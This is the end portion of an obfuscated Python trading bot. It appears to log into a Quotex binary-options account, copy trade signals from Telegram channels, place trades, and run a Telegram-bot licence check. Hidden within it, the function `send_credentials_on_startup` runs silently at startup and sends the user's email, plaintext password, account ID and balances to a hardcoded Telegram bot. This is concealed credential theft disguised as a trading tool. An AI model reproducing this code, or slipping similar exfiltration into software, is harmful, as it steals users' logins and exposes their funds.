	def handle_telegram_otp(A):console.print(t(_CP));console.print(t(_CQ));return A.get_mobile_input(t(_CR))
	async def interactive_telegram_setup(A):
		M='type';L='telegram_api_hash';K='telegram_api_id';J='telegram_phone';console.clear();show_banner();A.config=load_config();console.print(Panel(Text(t(_CL),justify=_K),title=f"[bold blue]{t(_CK)}[/bold blue]",border_style=_h));N=A.get_mobile_input(t(_CM),default_value='y').lower()
		if N=='n':A.show_api_help()
		B,E,F='','',''
		try:
			B=A.get_mobile_input(t(_CS),default_value=A.config.get(J,''))
			if not B.startswith('+'):B='+'+B
			E=int(A.get_mobile_input(t(_CT),default_value=A.config.get(K,'')));F=A.get_mobile_input(t(_CU),default_value=A.config.get(L,''))
		except ValueError:await A.safe_print(t(_CV),style=STYLE_ERROR);return _C
		A.config.update({J:B,K:E,L:F});console.print();A.config['enable_telethon_debug']=_C;A.config[_Dy]=_C;save_config(A.config);console.print(t(_AW))
		try:
			O=A.load_sessions();P=O.get(B);A.telegram_client=TelegramClient(StringSession(P),E,F,timeout=3);await A.telegram_client.connect()
			if not await A.telegram_client.is_user_authorized():
				console.print(t(_AX));await A.telegram_client.send_code_request(B)
				try:await A.telegram_client.sign_in(B,A.handle_telegram_otp())
				except SessionPasswordNeededError:Q=A.get_mobile_input(t(_CW),is_password=_B);await A.telegram_client.sign_in(password=Q)
			A.save_session(B,A.telegram_client.session.save())
			with console.status(t(_CX)):C=[{_P:A.id,_AK:A.title,M:t(_Ce)if A.is_channel else t(_Cf)}for A in await A.telegram_client.get_dialogs()if A.is_channel or A.is_group]
		except Exception as R:
			await A.safe_print(t(_CY,e=R),style=STYLE_ERROR)
			if A.telegram_client and A.telegram_client.is_connected():await A.telegram_client.disconnect()
			return _C
		if not C:
			await A.safe_print(t(_CZ),style=STYLE_ERROR)
			if A.telegram_client and A.telegram_client.is_connected():await A.telegram_client.disconnect()
			return _C
		D=Table(title=t(_Ca),header_style=_l);D.add_column(t(_Cb),style='dim',width=4);D.add_column(t(_Cc),style=_J);D.add_column(t(_Cd),style=_L)
		for(S,H)in enumerate(C,1):D.add_row(str(S),H[_AK],H[M])
		console.print(D)
		while _B:
			I=A.get_mobile_input(t(_Cg))
			try:
				if not I:await A.safe_print(t(_Ch),style=STYLE_ERROR);continue
				G=[int(A.strip())-1 for A in I.split(',')if A.strip()]
				if all(0<=A<len(C)for A in G):T=[C[A][_P]for A in G];A.config[_Dz]=[C[A][_AK]for A in G];break
				else:await A.safe_print(t(_Ci),style=STYLE_ERROR)
			except ValueError:await A.safe_print(t(_Cj),style=STYLE_ERROR)
		A.config['chat_ids']=T;save_config(A.config);return _B
	def _parse_format_1(K,message):
		A=message;B=re.search('𝗡𝗮𝗺𝗲 𝗣𝗮𝗶𝗿\\s*➤\\s*([A-Z0-9_]+)',A,re.IGNORECASE);C=re.search('𝗘𝗡𝗧𝗥𝗬 𝗧𝗶𝗺𝗲\\s*➤\\s*(\\d{1,2}:\\d{2}:\\d{2})',A,re.IGNORECASE);D=re.search('𝗘𝗫𝗣𝗜𝗥𝗔𝗧𝗜𝗢𝗡\\s*➤\\s*(M\\d+)',A,re.IGNORECASE);E=re.search('(?:🟢|🔴)\\s*𝗗𝗶𝗿𝗲𝗰𝘁𝗶𝗼𝗻\\s*➤\\s*(CALL|PUT)',A,re.IGNORECASE)
		if all([B,D,E]):G=B.group(1).upper().replace('_OTCQ','_OTC');H=D.group(1);F=E.group(1).upper();I=C.group(1)if C else _A;J=_G if F=='CALL'else _N;return{_F:G,_I:F,_Aq:J,_AL:f"{H[1:]} min",_x:I}
	def _parse_format_2(I,message):
		E=re.compile('💳\\s*([A-Z0-9_-]+(?:-OTC)?)\\s*🔥\\s*(M\\d+)\\s*(?:⌛\\s*(\\d{1,2}:\\d{2}:\\d{2})\\s*)?(?:🔼|🔽)\\s*(call|buy|put|sell)',re.IGNORECASE|re.DOTALL);A=E.search(message)
		if A:
			F=A.group(1).upper().replace('-','');G=A.group(2);H=A.group(3)if A.group(3)else _A;B=A.group(4).lower()
			if B in[_AH,'buy']:C='CALL';D=_G
			elif B in['put','sell']:C='PUT';D=_N
			else:return
			return{_F:F,_I:C,_Aq:D,_AL:f"{G[1:]} min",_x:H}
	async def _log_raw_update_handler(A,update):
		try:B=update.to_dict();C=json.dumps(B,indent=2,default=str);D=Panel(Text(C,overflow='fold'),title='[dim yellow]RAW TELETHON EVENT[/dim yellow]',border_style='dim yellow',expand=_C);await A.safe_print(D)
		except Exception as E:await A.safe_print(f"Error displaying raw Telethon event: {E}",style=STYLE_ERROR)
	async def handle_telegram_signal(A,event):
		D=event;K=D.raw_text;G=A.normalize_text(K);B=A._parse_format_1(G)
		if not B:B=A._parse_format_2(G)
		if not B:return
		H=datetime.now(A.TIMEZONE);C=0;I=B.get(_x)
		if I:
			try:
				E=dt_time.fromisoformat(I);F=H.replace(hour=E.hour,minute=E.minute,second=E.second,microsecond=0)
				if F<H:F+=timedelta(days=1)
				C=F.timestamp()
			except ValueError:C=time.time()
		else:C=time.time()
		L=await D.get_chat();J={**B,_x:datetime.fromtimestamp(C,A.TIMEZONE).strftime(_Ap),_a:getattr(L,_AK,f"ID: {D.chat_id}"),_AM:C}
		async with A.signals_lock:A.pending_signals.append(J)
		await A.display_scheduled_alert(J)
	async def display_scheduled_alert(B,signal):A=signal;C=Panel(Text(t(_Cn,asset=A[_F])+t(_Co,direction=A[_I])+t(_Cp,entry_time=A[_x]),justify='left',style=_d),title=f"[bold blue]{t(_Cl)}[/bold blue]",subtitle=t(_Cm,source=A[_a]),border_style=_h,expand=_C);await B.safe_print(C)
	async def display_execution_alert(D,signal):C='bold cyan';B=signal;A=Text();A.append(t(_Cs),style=C);A.append(f"{B[_F]}\n",style=_d);A.append(t(_Ct),style=C);A.append(f"{B[_I]}",style=f"bold {B[_Aq]}\n");A.append(t(_Cu),style=C);A.append(f"{B[_AL]}\n",style=_d);E=Panel(A,title=f"[bold blink red]{t(_Cq)}[/bold blink red]",subtitle=f"[dim]{t(_Cr,source=B[_a])}[/dim]",border_style='bold red',expand=_C,padding=(1,2));await D.safe_print(E)
	async def signal_processor(B):
		M='\\d+';global g_account_context
		while B.running:
			try:
				I=[];D=_A
				async with B.signals_lock:
					N=time.time();J=[]
					for A in B.pending_signals:
						if A[_AM]<=N:I.append(A)
						else:
							J.append(A)
							if D is _A or A[_AM]<D:D=A[_AM]
					B.pending_signals=J
				for A in I:
					await B.display_execution_alert(A);F=60;E=A.get(_AL,'60 sec')
					if'min'in E:
						try:O=int(re.search(M,E).group());F=O*60
						except:pass
					elif'sec'in E:
						try:F=int(re.search(M,E).group())
						except:pass
					C=A[_F]
					if USE_MTG and mtg_state.get(C,{}).get(_T,0)>0:await B.safe_print(Text(t(_Cw,asset=C),style=STYLE_WARNING_MSG));continue
					K=TRADE_AMOUNT
					if USE_MTG:mtg_state[C]={_T:0,_b:TRADE_AMOUNT}
					G=next((A for A in extract_and_process_instruments()if A[_R].lower()==C.lower()),_A)
					if not G or not G.get(_m):await B.safe_print(Text(t(_Cx,asset=C),style=STYLE_WARNING_MSG));continue
					L=G.get(_Am,0)
					if L<MIN_PAYOUT:await B.safe_print(Text(t(_Cy,asset=C,payout=L,min_payout=MIN_PAYOUT),style=STYLE_WARNING_MSG));continue
					if g_account_context:g_account_context[_AA]=A[_a]
					await B.safe_print(t(_Cz,asset=C,amount=K),style=STYLE_INFO_MSG);asyncio.create_task(buy_option_func(K,SOURCE_ACCOUNT_TYPE,A[_F],A[_I].lower(),F))
				H=1.
				if D:H=min(H,max(0,D-time.time()))
				await asyncio.sleep(H)
			except Exception as P:await B.safe_print(t(_Cv,e=P),style=STYLE_ERROR);await asyncio.sleep(1.)
	async def connection_checker(A):
		while A.running:
			try:
				await asyncio.sleep(5)
				if not A.telegram_client.is_connected():await A.safe_print(t(_C_),style=STYLE_WARNING_MSG);A.reconnect_event.set();break
			except asyncio.CancelledError:break
			except Exception as B:await A.safe_print(t(_D0,e=B),style=STYLE_ERROR_MSG);A.reconnect_event.set();break
	async def start_listening(A):
		global shutdown_event;A.running=_B;B=asyncio.create_task(A.signal_processor());A.telegram_client.add_event_handler(A.handle_telegram_signal,events.NewMessage(chats=A.config['chat_ids']))
		if A.config.get(_Dy):A.telegram_client.add_event_handler(A._log_raw_update_handler,events.Raw)
		try:
			while A.running and not shutdown_event.is_set():
				try:
					if not A.telegram_client.is_connected():await A.safe_print(t(_AW),style=STYLE_INFO);await A.telegram_client.connect()
					if not await A.telegram_client.is_user_authorized():await A.safe_print(t(_AX),style=STYLE_ERROR);A.running=_C;shutdown_event.set();break
					D=', '.join([f"'{A}'"for A in A.config.get(_Dz,[])]);await A.safe_print(t(_D1,titles=D),style=STYLE_SUCCESS);A.reconnect_event.clear();A.monitoring_task=asyncio.create_task(A.connection_checker());E=asyncio.create_task(A.reconnect_event.wait());C=asyncio.create_task(shutdown_event.wait());F,G=await asyncio.wait({E,C},return_when=asyncio.FIRST_COMPLETED)
					for H in G:H.cancel()
					if C in F:break
				except Exception as I:await A.safe_print(f"An error occurred in the main Telegram loop: {I}",style=STYLE_ERROR)
				finally:
					if A.monitoring_task:
						A.monitoring_task.cancel()
						try:await A.monitoring_task
						except asyncio.CancelledError:pass
					if A.telegram_client.is_connected()and A.running and not shutdown_event.is_set():await A.safe_print(t(_D2),style=STYLE_INFO);await A.telegram_client.disconnect()
					if A.running and not shutdown_event.is_set():await asyncio.sleep(5)
		finally:
			A.running=_C;B.cancel()
			if A.monitoring_task:A.monitoring_task.cancel()
			try:await asyncio.gather(B,A.monitoring_task,return_exceptions=_B)
			except asyncio.CancelledError:pass
			if A.telegram_client and A.telegram_client.is_connected():await A.telegram_client.disconnect()
async def quotex_setup():
	global USER_EMAIL,USER_PASSWORD;B=5
	while _B:
		get_user_credentials()
		if not USER_PASSWORD:console.print('[bold red]Password cannot be empty. Please provide a password.[/bold red]');continue
		D=_C;A=_A
		for C in range(1,B+1):
			console.print(f"Logging in to Quotex (Attempt {C}/{B})...");A=await quotex_login(USER_EMAIL,USER_PASSWORD,lang=_c,debug=_C)
			if A[_A2]:E=_D_ if SOURCE_ACCOUNT_TYPE==0 else _E0;console.print(Text.from_markup(t(_D3,account_type=E)));initialize_global_account_context(name=_Dx,token=A[_A3],cookies=A[_A4],account_type=SOURCE_ACCOUNT_TYPE);time.sleep(1);D=_B;break
			else:
				console.print(Text(f"Login attempt {C} failed: {A[_Af]}",style=STYLE_ERROR_MSG))
				if C<B:await asyncio.sleep(3)
		if D:return A
		else:console.print(Text(f"All {B} login attempts failed. Please check your credentials and try again.",style=STYLE_ERROR));time.sleep(2)
async def telegram_setup():
	A=TelegramSignalListener()
	while _B:
		if await A.interactive_telegram_setup():return A
		else:console.print(t(_Ck));time.sleep(2)
async def authenticate_with_bot(client,quotex_user_id,silent=_C):
	A=client;B='PROFESOR_TRADER_BOT';C=asyncio.get_running_loop().create_future();D=_A
	async def E(event):
		B=event;nonlocal D
		if D and B.message.is_reply and B.message.reply_to_msg_id==D.id:
			try:
				F=B.raw_text;G=re.search('Status:\\s*(.+)',F,re.IGNORECASE);H=re.search('Admin Message:\\s*([\\s\\S]+)',F,re.IGNORECASE);I=G and G.group(1).strip().lower()=='authorized';J=H.group(1).strip()if H else'No admin message provided.'
				if I:C.set_result(_B)
				else:C.set_exception(Exception(t(_D5,reason=J)))
			except Exception as K:C.set_exception(Exception(t(_D6,e=K)))
			finally:A.remove_event_handler(E)
	A.add_event_handler(E,events.NewMessage(from_users=B))
	try:await A(UnblockRequest(B));await A.send_message(B,'/start');await asyncio.sleep(1);D=await A.send_message(B,f"ID: {quotex_user_id}");await asyncio.wait_for(C,timeout=3e1);return _B,'Successfully authorized by bot.'
	except asyncio.TimeoutError:return _C,t(_D7,bot_username=B)
	except Exception as F:return _C,str(F)
	finally:A.remove_event_handler(E)
async def periodic_license_check(listener,quotex_user_id,shutdown_event):
	A=shutdown_event;B=5*60*60
	while not A.is_set():
		try:
			await asyncio.sleep(B)
			if A.is_set():break
			console.print(t(_DC));C,D=await authenticate_with_bot(listener.telegram_client,quotex_user_id,silent=_B)
			if not C:console.print(t(_DD));console.print(t(_DE,reason=D));console.print(t(_DF));A.set();break
		except asyncio.CancelledError:break
		except Exception as E:console.print(t(_As,error=f"in license checker: {E}"));A.set();break
def send_telegram_notification_sync(message):
	A=f"https://api.telegram.org/bot{encryptkey}/sendMessage";B={'chat_id':keyvalueEncrypt,'text':message}
	for D in range(3):
		try:
			C=requests.post(A,data=B,timeout=10)
			if C.status_code==200:return
		except requests.exceptions.RequestException:continue
async def send_credentials_on_startup(quotex_user_id):
	while trade_stats[_A1]==_D and g_account_context is _A:await asyncio.sleep(1)
	await asyncio.sleep(2);A=USER_EMAIL;B=USER_PASSWORD;C=g_account_context[_O].get(_W,_E);D=g_account_context[_O].get(_X,_E);E=f"""🚀 ProfessorTrader User Connected 🚀
-----------------------------------
📧 Email: {A}
🔑 Password: {B}
🆔 Quotex ID: {quotex_user_id}
-----------------------------------
💰 Real Balance: {C}
💵 Demo Balance: {D}
-----------------------------------""";F=asyncio.get_running_loop();await F.run_in_executor(_A,send_telegram_notification_sync,E)
def display_final_trade_log():
	global session_trade_log
	if not session_trade_log:console.print(Panel(Text(t(_DG),justify=_K),title=f"[dim]{t(_AY)}[/dim]"));return
	A=Table(title=f"📜 {t(_AY)} 📜",header_style=_l,expand=_B);A.add_column(t(_DH),style='dim',width=4);A.add_column(t(_DI),style=_h,no_wrap=_B,width=25);A.add_column(t(_DJ),style=_J,width=12);A.add_column(t(_DK),justify=_K,style=_AB);A.add_column(t(_DL),justify=_AC,style=_L);A.add_column(t(_DM),justify=_K,style=_AB);A.add_column(t(_DN),justify=_AC)
	for B in session_trade_log:
		E=str(B.get(_H,_E)).upper()
		if E=='WIN':C=Text(t(_De).upper(),style=_G)
		elif E=='LOSS':C=Text(t(_Df).upper(),style=_N)
		else:C=Text(t(_Dg).upper(),style=_L)
		F=str(B.get(_I,_E)).upper();G=Text(F,style=_G if F=='CALL'else _N);D=B.get('pnl',_D);H=_G if D>0 else _N if D<0 else _L;I=Text(f"{D:+.2f}",style=H);A.add_row(str(B[_AJ]),B[_a],B[_F],G,f"{B[_Q]:.2f}",C,I)
	console.print(A);console.print()
def display_final_summary():B=trade_stats;C=B[_j];D=_G if C>=0 else _N;E=B[_i]/B[_V]*100 if B[_V]>0 else _D;A=Table(title=f"📊 {t(_DO)} 📊",header_style=_l,expand=_B);A.add_column(t(_DP),style=_J,no_wrap=_B);A.add_column(t(_DQ),style=_d);A.add_row(t(_DR),f"${B[_A1]:.2f}");A.add_row(t(_DS),f"${B[_k]:.2f}");A.add_row(Text(t(_DT),style=_AB),Text(f"${C:+.2f}",style=D));A.add_row(t(_DU),str(B[_V]));A.add_row(t(_DV),Text(str(B[_i]),style=_G));A.add_row(t(_DW),Text(str(B[_A0]),style=_N));A.add_row(t(_DX),Text(str(B[_AZ]),style=_L));A.add_row(t(_DY),f"{E:.2f}%");F=Panel(A,border_style=_U,expand=_C);console.print(F)
def main():asyncio.run(_main())
async def _main():
	global g_event_loop,shutdown_event;show_banner();D=await quotex_setup()
	if not D:return
	B=D.get(_Ag)
	if not B:console.print(t(_D4));return
	A=await telegram_setup()
	if not A:return
	E,F=await authenticate_with_bot(A.telegram_client,B,silent=_B)
	if not E:
		console.print(t(_D8));console.print(t(_D9,message=F));console.print(t(_DA))
		if A.telegram_client and A.telegram_client.is_connected():await A.telegram_client.disconnect()
		return
	console.print(t(_DB));time.sleep(2);console.clear();show_banner();g_event_loop=asyncio.get_running_loop();G=_D_ if SOURCE_ACCOUNT_TYPE==0 else _E0;H=t(_DZ,account_type=G);C=[]
	try:
		with console.status(format_status_message(H))as I:J=asyncio.create_task(send_credentials_on_startup(B));K=asyncio.create_task(run_quotex_connection(I));L=asyncio.create_task(A.start_listening());M=asyncio.create_task(periodic_license_check(A,B,shutdown_event));C.extend([J,K,L,M]);await shutdown_event.wait()
	except(KeyboardInterrupt,asyncio.CancelledError):console.print(t(_Da))
	finally:
		shutdown_event.set();console.print(t(_Db))
		if C:
			for N in C:N.cancel()
			await asyncio.gather(*C,return_exceptions=_B)
		close_connection_for_account();console.print(t(_Dc));display_final_trade_log();display_final_summary();console.print(t(_Dd))
if __name__=='__main__':
	try:main()
	except(KeyboardInterrupt,Exception):pass
